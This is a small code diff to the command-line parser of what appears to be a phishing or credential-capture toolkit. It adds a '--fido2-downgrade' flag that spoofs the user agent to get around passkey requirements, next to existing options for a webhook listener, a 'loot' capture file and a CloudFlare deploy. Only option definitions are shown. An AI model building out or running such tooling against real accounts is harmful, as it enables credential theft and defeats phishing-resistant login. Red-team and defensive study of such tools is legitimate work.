@@ -129,6 +129,8 @@ def create_parser() -> Tuple[argparse.ArgumentParser, Dict[str, argparse.Argumen
         help='Webhook listener port (default: 9999)')
     deploy_local_parser.add_argument('--loot-file', type=str, default=None,
         help='Log captures to file (JSONL)')
+    deploy_local_parser.add_argument('--fido2-downgrade', action='store_true', default=False,
+        help='Enable FIDO2 authentication downgrade (spoof UA to bypass passkey requirements)')
     deploy_sub.add_parser('remote', help='Deploy to CloudFlare')
 
     # Status command
